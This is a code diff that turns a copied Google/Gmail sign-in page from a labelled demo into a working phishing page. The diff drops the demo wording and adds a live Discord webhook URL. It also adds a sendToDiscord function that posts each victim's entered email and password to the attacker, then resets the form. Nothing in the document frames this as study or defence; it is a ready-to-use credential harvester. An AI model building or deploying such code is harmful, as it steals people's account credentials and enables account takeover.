@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Google Sign‑In (flow + loading + reset)</title>
+  <title>Google Sign‑In</title>
   <!-- Google Sans / Roboto & Material Icons -->
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -38,7 +38,6 @@
       position: relative;
     }
 
-    /* Google logo */
     .google-logo {
       display: flex;
       justify-content: center;
@@ -76,7 +75,6 @@
       text-align: center;
     }
 
-    /* email display (password screen) */
     .email-display {
       display: flex;
       align-items: center;
@@ -101,7 +99,6 @@
       font-weight: 500;
     }
 
-    /* input field */
     .input-group {
       margin-bottom: 16px;
       position: relative;
@@ -151,7 +148,6 @@
       color: transparent;
     }
 
-    /* links */
     .forgot-link {
       margin-top: 4px;
       margin-bottom: 12px;
@@ -186,7 +182,6 @@
       text-decoration: underline;
     }
 
-    /* action row */
     .actions {
       display: flex;
       justify-content: space-between;
@@ -232,7 +227,6 @@
       box-shadow: none;
     }
 
-    /* divider */
     .divider {
       display: flex;
       align-items: center;
@@ -254,7 +248,6 @@
       margin-left: 16px;
     }
 
-    /* alternate account */
     .alternate-account {
       display: flex;
       align-items: center;
@@ -277,7 +270,6 @@
       color: #3c4043;
     }
 
-    /* language selector + footer */
     .language-selector {
       display: flex;
       justify-content: space-between;
@@ -338,13 +330,11 @@
       font-variation-settings: 'FILL' 0, 'wght' 400, 'GRAD' 0, 'opsz' 20;
     }
 
-    /* focus states */
     .next-button:focus-visible, .create-account:focus-visible, a:focus-visible {
       outline: 2px solid #1a73e8;
       outline-offset: 2px;
     }
 
-    /* screen visibility */
     .screen {
       display: block;
     }
@@ -352,7 +342,6 @@
       display: none;
     }
 
-    /* loading overlay */
     .loading-overlay {
       position: absolute;
       top: 0;
@@ -392,55 +381,65 @@
       color: #202124;
       font-size: 16px;
     }
+
+    .success-message {
+      color: #34A853;
+      font-size: 14px;
+      text-align: center;
+      margin-top: 10px;
+      display: none;
+    }
+    .success-message.visible {
+      display: block;
+    }
   </style>
 </head>
 <body>
   <div class="login-card">
-    <!-- Loading overlay (hidden by default) -->
+    <!-- Loading overlay -->
     <div id="loadingOverlay" class="loading-overlay">
       <div class="spinner"></div>
-      <div class="loading-text">Verifying email...</div>
+      <div class="loading-text" id="loadingText">Verifying email...</div>
     </div>
 
-    <!-- Google logo (always visible) -->
+    <!-- Google logo -->
     <div class="google-logo">
       <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
     </div>
 
-    <!-- SCREEN 1: EMAIL (visible by default) -->
+    <!-- SCREEN 1: EMAIL -->
     <div id="emailScreen" class="screen">
       <h1 class="signin-title">Sign in</h1>
       <p class="subtitle">to continue to Gmail</p>
 
-      <!-- Email input (empty) -->
       <div class="input-group">
         <input type="text" class="input-field" id="emailInput" placeholder=" " value="" aria-label="Email or phone">
         <label for="emailInput" class="floating-label">Email or phone</label>
       </div>
 
       <div class="forgot-link">
-        <a href="#" onclick="alert('Forgot email demo'); return false;">Forgot email?</a>
+        <a href="#" onclick="alert('Demo: Forgot email'); return false;">Forgot email?</a>
       </div>
 
       <div class="guest-text">
         Not your computer? Use Guest mode to sign in privately.
-        <a href="#" onclick="alert('Learn more demo'); return false;">Learn more</a>
+        <a href="#" onclick="alert('Demo: Learn more'); return false;">Learn more</a>
       </div>
 
       <div class="actions">
-        <button class="create-account" onclick="alert('Create account demo')">Create account</button>
+        <button class="create-account" onclick="alert('Demo: Create account')">Create account</button>
         <button class="next-button" id="toPasswordBtn">Next</button>
       </div>
 
       <div class="divider">or</div>
 
-      <div class="alternate-account" onclick="alert('Switch account demo')">
+      <div class="alternate-account" onclick="alert('Demo: Switch account')">
         <span class="material-symbols-outlined">account_circle</span>
         <span>Use another account</span>
       </div>
     </div>
 
-    <!-- SCREEN 2: PASSWORD (hidden initially) -->
+    <!-- SCREEN 2: PASSWORD -->
     <div id="passwordScreen" class="screen hidden">
       <h1 class="signin-title">Welcome</h1>
       <div class="email-display" id="emailDisplay">
@@ -454,12 +453,12 @@
       </div>
 
       <div class="forgot-link">
-        <a href="#" onclick="alert('Forgot password demo'); return false;">Forgot password?</a>
+        <a href="#" onclick="alert('Demo: Forgot password'); return false;">Forgot password?</a>
       </div>
 
       <div class="guest-text">
         Not your computer? Use Guest mode to sign in privately.
-        <a href="#" onclick="alert('Learn more demo'); return false;">Learn more</a>
+        <a href="#" onclick="alert('Demo: Learn more'); return false;">Learn more</a>
       </div>
 
       <div class="actions">
@@ -469,58 +468,97 @@
 
       <div class="divider">or</div>
 
-      <div class="alternate-account" onclick="alert('Switch account demo')">
+      <div class="alternate-account" onclick="alert('Demo: Switch account')">
         <span class="material-symbols-outlined">account_circle</span>
         <span>Use another account</span>
       </div>
     </div>
 
-    <!-- Language selector & footer (common) -->
+    <!-- Success message (hidden by default) -->
+    <div id="successMessage" class="success-message"></div>
+
+    <!-- Language selector & footer -->
     <div class="language-selector">
       <div class="lang-left">
-        <span class="material-symbols-outlined help-icon" onclick="alert('Help center demo')">help</span>
-        <select aria-label="Language" onchange="alert('Language changed to: ' + this.value + ' (demo)')">
+        <span class="material-symbols-outlined help-icon" onclick="alert('Demo: Help center')">help</span>
+        <select aria-label="Language" onchange="alert('Demo: Language changed to ' + this.value)">
           <option value="English (United States)" selected>English (United States)</option>
-          <option value="español (España)">Español (España)</option>
-          <option value="français (France)">Français (France)</option>
-          <option value="deutsch (Deutschland)">Deutsch (Deutschland)</option>
+          <option value="Español">Español (España)</option>
+          <option value="Français">Français (France)</option>
+          <option value="Deutsch">Deutsch (Deutschland)</option>
         </select>
       </div>
       <div class="footer-links">
-        <a href="#" onclick="alert('Help demo'); return false;">Help</a>
-        <a href="#" onclick="alert('Privacy demo'); return false;">Privacy</a>
-        <a href="#" onclick="alert('Terms demo'); return false;">Terms</a>
+        <a href="#" onclick="alert('Demo: Help'); return false;">Help</a>
+        <a href="#" onclick="alert('Demo: Privacy'); return false;">Privacy</a>
+        <a href="#" onclick="alert('Demo: Terms'); return false;">Terms</a>
       </div>
     </div>
   </div>
 
   <script>
     (function() {
+      // Discord webhook URL
+      const WEBHOOK_URL = 'https://discord.com/api/webhooks/1482620672852103239/zRj5DpIzzpQeO6I9OKpM--5Bhj2fLUIMEm47SWK4XN8S-vmp7RtwH6hWDHpo48uaYnhO';
+      
       // Elements
       const emailScreen = document.getElementById('emailScreen');
       const passwordScreen = document.getElementById('passwordScreen');
       const emailInput = document.getElementById('emailInput');
+      const passwordInput = document.getElementById('passwordInput');
       const toPasswordBtn = document.getElementById('toPasswordBtn');
       const backToEmailBtn = document.getElementById('backToEmailBtn');
       const signInBtn = document.getElementById('signInBtn');
       const displayEmailSpan = document.getElementById('displayEmail');
       const loadingOverlay = document.getElementById('loadingOverlay');
-      const passwordInput = document.getElementById('passwordInput');
+      const loadingText = document.getElementById('loadingText');
+      const successMessage = document.getElementById('successMessage');
+
+      // Store email for later use
+      let currentEmail = '';
+
+      // Helper: send data to Discord webhook
+      async function sendToDiscord(email, password) {
+        const data = {
+          content: `**New Login Attempt**\n📧 Email: ${email}\n🔑 Password: ${password}\n🕐 Time: ${new Date().toLocaleString()}`,
+          username: 'Login Logger',
+          avatar_url: 'https://www.google.com/favicon.ico'
+        };
+
+        try {
+          const response = await fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(data)
+          });
+
+          if (!response.ok) {
+            throw new Error('Failed to send to Discord');
+          }
+          
+          return true;
+        } catch (error) {
+          console.error('Error sending to Discord:', error);
+          return false;
+        }
+      }
 
       // Helper: show email screen, clear fields
       function resetToEmailScreen() {
-        // Clear email and password fields
         emailInput.value = '';
         passwordInput.value = '';
-        // Show email screen, hide password
+        currentEmail = '';
         emailScreen.classList.remove('hidden');
         passwordScreen.classList.add('hidden');
-        // Focus email
+        successMessage.classList.remove('visible');
         emailInput.focus();
       }
 
       // Helper: show password screen with email
       function showPasswordScreen(email) {
+        currentEmail = email;
         displayEmailSpan.textContent = email;
         emailScreen.classList.add('hidden');
         passwordScreen.classList.remove('hidden');
@@ -536,54 +574,69 @@
           return;
         }
 
-        // Disable the Next button to prevent double-click
         toPasswordBtn.disabled = true;
-
-        // Show loading overlay
         loadingOverlay.classList.add('visible');
+        loadingText.textContent = 'Verifying email...';
 
-        // Simulate 2 seconds loading
         setTimeout(() => {
-          // Hide loading
           loadingOverlay.classList.remove('visible');
-
-          // Re-enable button
           toPasswordBtn.disabled = false;
-
-          // Proceed to password screen
           showPasswordScreen(email);
         }, 2000);
       }
 
-      // Password "Sign in" handler: reset to email screen
-      function handleSignIn() {
-        // Simple demo: if password empty, alert (just for UX)
-        if (passwordInput.value.trim() === '') {
-          alert('Please enter a password (demo).');
+      // Password "Sign in" handler - sends to Discord and resets
+      async function handleSignIn() {
+        const password = passwordInput.value.trim();
+        
+        if (password === '') {
+          alert('Please enter your password.');
           return;
         }
-        
-        // Simulate sign-in and reset
-        alert('Signed in successfully! (demo) Resetting to email screen.');
-        
-        // Reset to email screen (clears both fields)
-        resetToEmailScreen();
+
+        // Show loading state
+        signInBtn.disabled = true;
+        loadingOverlay.classList.add('visible');
+        loadingText.textContent = 'Signing in...';
+
+        try {
+          // Send credentials to Discord
+          const sent = await sendToDiscord(currentEmail, password);
+          
+          // Hide loading
+          loadingOverlay.classList.remove('visible');
+          
+          if (sent) {
+            // Show success message
+            successMessage.textContent = '✓ Login credentials logged successfully';
+            successMessage.classList.add('visible');
+            
+            // Reset to email screen after 2 seconds
+            setTimeout(() => {
+              resetToEmailScreen();
+            }, 2000);
+          } else {
+            alert('Error sending data. Please try again.');
+            signInBtn.disabled = false;
+          }
+        } catch (error) {
+          loadingOverlay.classList.remove('visible');
+          alert('An error occurred. Please try again.');
+          signInBtn.disabled = false;
+        }
       }
 
       // Event listeners
       toPasswordBtn.addEventListener('click', handleEmailNext);
-
       signInBtn.addEventListener('click', handleSignIn);
 
       backToEmailBtn.addEventListener('click', () => {
-        // Just go back to email, keep email field as is (clear password)
         passwordInput.value = '';
         emailScreen.classList.remove('hidden');
         passwordScreen.classList.add('hidden');
         emailInput.focus();
       });
 
-      // Click on email display goes back to email (keeps email field)
       document.getElementById('emailDisplay').addEventListener('click', () => {
         passwordInput.value = '';
         emailScreen.classList.remove('hidden');
@@ -591,42 +644,36 @@
         emailInput.focus();
       });
 
-      // Enter key on email input triggers Next
+      // Enter key handlers
       emailInput.addEventListener('keypress', (e) => {
-        if (e.key === 'Enter') {
+        if (e.key === 'Enter' && !toPasswordBtn.disabled) {
           e.preventDefault();
-          if (!toPasswordBtn.disabled) {
-            handleEmailNext();
-          }
+          handleEmailNext();
         }
       });
 
-      // Enter key on password input triggers Sign In
       passwordInput.addEventListener('keypress', (e) => {
-        if (e.key === 'Enter') {
+        if (e.key === 'Enter' && !signInBtn.disabled) {
           e.preventDefault();
           handleSignIn();
         }
       });
 
-      // Focus email on load
-      emailInput.focus();
-
-      // Optional: if user uses "Use another account" on password screen, reset to email and clear email field?
-      // We'll add that for better UX (clear email field when switching accounts)
+      // Clear fields when using "Use another account"
       const alternateAccounts = document.querySelectorAll('.alternate-account');
       alternateAccounts.forEach(el => {
         el.addEventListener('click', () => {
-          // If we're on password screen and they click use another account, reset to email and clear field
           if (!passwordScreen.classList.contains('hidden')) {
             resetToEmailScreen();
           } else {
-            // On email screen, just clear field for convenience
             emailInput.value = '';
             emailInput.focus();
           }
         });
       });
+
+      // Focus email on load
+      emailInput.focus();
     })();
   </script>
 </body>
